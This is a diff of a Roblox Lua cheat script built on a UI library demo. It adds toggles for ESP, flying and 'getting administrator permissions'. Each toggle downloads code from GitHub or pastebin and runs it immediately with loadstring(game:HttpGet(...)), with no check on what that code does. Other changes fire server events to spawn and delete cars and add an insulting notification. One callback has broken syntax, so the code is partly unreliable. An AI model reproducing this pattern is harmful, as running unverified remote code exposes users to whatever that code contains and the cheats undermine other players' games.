@@ -17,7 +17,7 @@ local mainWindow = WasUIPro:CreateWindow({
     GroupText = "加入交流群",
     GroupCopy = "1070641947", 
     SnowEnabled = true,
-    Background = "https://qun.qq.com/universal-share/share?ac=1&authKey=kcScr28o93SlfkdtYL9aLLh0PzHxSteBSSpFLIX1e8dMuyFfN8GTJQvsk/8H59X2&busi_data=eyJncm91cENvZGUiOiIxMDcwNjQxOTQ3IiwidG9rZW4iOiJ3WkdiOVAwNlU5Rk1Ea1lCSUJSMzdSTTJ6c2xueGtXTlRUYXdhQWZuM2h5QUc4UkRTUHo5MGtCM2o0U3g0ZUJnIiwidWluIjoiMzU4MTkzODYxOCJ9&data=uG0jnOWSnrmGmttsS40EZqvwORt2h3A3p2tpK4VgHdLwE8XRitJ5iFXc_f72Oaky6_6KUVvNrtxmpHbOljpLEA&svctype=4&tempid=h5_group_info",
+    Background = "",
     Folder = "WasUIPro_示例配置",
     TitleTag = {
         { text = "Demo", backgroundColor = Color3.fromRGB(0,152,211), textColor = Color3.fromRGB(255,255,255) },
@@ -42,8 +42,11 @@ task.spawn(function()
         content = "完整控件演示，配置文件自动保存",
         confirmText = "开始体验",
         onConfirm = function()
+             --local RevenantLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/Revenant", true))()
+             WasUIPro:Notify({ Title = "JB", Content = "欢迎使用", Duration = 2 })
+             WasUIPro:Notify({ Title = "小天死妈", Content = "已经把小天的浮木杀了", Duration = 2 })
              WasUIPro:Notify({ Title = "脚本", Content = "开始使用", Duration = 2 })
-             
+             WasUIPro:Notify({ Title = "防挂机", Content = "已开启防挂机", Duration = 2 })
         end
     })
 end)
@@ -51,6 +54,15 @@ end)
 local basicTab = mainWindow:Tab({ Title = "基础控件" })
 local basicCategory = basicTab:Category({ Title = "常用控件", IconName = "layout-grid" })
 
+basicCategory:Button({
+    Text = "其他脚本",
+    Icon = "play",
+    Tooltip = "己切换其他脚本",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/%E6%B1%89%E5%8C%96%E5%A2%A8%E6%B0%B4Ringta.txt"))()
+        WasUIPro:Notify({ Title = "按钮", Content = "已切换其他脚本", Duration = 2 })
+        end
+})
 basicCategory:Button({
     Text = "召唤TIV2 2009",
     Icon = "car",
@@ -63,7 +75,6 @@ basicCategory:Button({
 		end
 	end
 end
-
     local Event = game:GetService("ReplicatedStorage").DeleteCar
         Event:FireServer(
         GetNil("PlayersCar", "1_6090979")
@@ -94,26 +105,6 @@ end
         WasUIPro:Notify({ Title = "按钮", Content = "你召唤了MDS", Duration = 2 })
     end
 })
-basicCategory:Button({
-    Text = "召唤MDS",
-    Icon = "car",
-    Tooltip = "已召唤MDS",
-    Callback = function()
-        local function GetNil(Name, DebugId)
-	    for _, Object in getnilinstances() do
-		if Object.Name == Name and Object:GetDebugId() == DebugId then
-			return Object
-		end
-	end
-end
-        local Event = game:GetService("ReplicatedStorage").SpawnCar
-        Event:FireServer(
-              "MDS"
-)
-        WasUIPro:Notify({ Title = "按钮", Content = "你召唤了MDS", Duration = 2 })
-    end
-})
-
 basicCategory:Toggle({
     Title = "自动拾取",
     Value = false,
@@ -160,12 +151,12 @@ basicCategory:Dropdown({
     end
 })
 
---多选的下拉菜单
+
 basicCategory:Dropdown({
     Title = "技能多选",
     Values = { "火球术", "冰霜新星", "闪现", "治疗术" },
-    Value = { "火球术", "闪现" }, -- 设置默认值
-    Multi = true, -- 控制多选
+    Value = { "火球术", "闪现" }, 
+    Multi = true, 
     ConfigKey = "skills",
     Callback = function(selected)
         print("已选技能", table.concat(selected, ", "))
@@ -447,7 +438,7 @@ local extraTab = mainWindow:Tab({ Title = "额外演示" })
 
 local extraCategory = extraTab:Category({ Title = "FeatureName 颜色展示", IconName = "palette" })
 extraCategory:Toggle({
-    Title = "功能 A",
+    Title = "不知道",
     Value = false,
     FeatureName = "FeatureA",
     Icon = "circle",
@@ -458,34 +449,37 @@ extraCategory:Toggle({
 })
 
 extraCategory:Toggle({
-    Title = "功能 B",
+    Title = "透视",
     Value = true,
     FeatureName = "FeatureB",
     Icon = "circle",
-    Tooltip = "FeatureB 演示",
+    Tooltip = "透视",
     Callback = function(state)
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/ZIONPCE/raw/refs/heads/main/ESP.lua"))()
         WasUIPro:Notify({ Title = "FeatureB", Content = state and "开启" or "关闭", Duration = 1 })
     end
 })
 
 extraCategory:Toggle({
-    Title = "功能 C",
+    Title = "飞行V3",
     Value = false,
     FeatureName = "FeatureC",
     Icon = "circle",
-    Tooltip = "FeatureC 演示",
+    Tooltip = "装逼让你飞起来",
     Callback = function(state)
-        WasUIPro:Notify({ Title = "FeatureC", Content = state and "开启" or "关闭", Duration = 1 })
+         loadstring(game:HttpGet("https://raw.githubusercontent.com/3490168468w-dotcom/GND-HUB/main/Fly%20V3%20GND"))()
+        WasUIPro:Notify({ Title = "FeatureC", Content = state and "已开启飞行" or "已关闭飞行", Duration = 1 })
     end
 })
 
 extraCategory:Toggle({
-    Title = "功能 D",
+    Title = "获得管理员权限",
     Value = true,
     FeatureName = "FeatureD",
     Icon = "circle",
-    Tooltip = "FeatureD 演示",
+    Tooltip = "权限",
     Callback = function(state)
+        loadstring(game:HttpGet("https://pastebin.com/raw/sZpgTVas"))()end)
         WasUIPro:Notify({ Title = "FeatureD", Content = state and "开启" or "关闭", Duration = 1 })
     end
 })
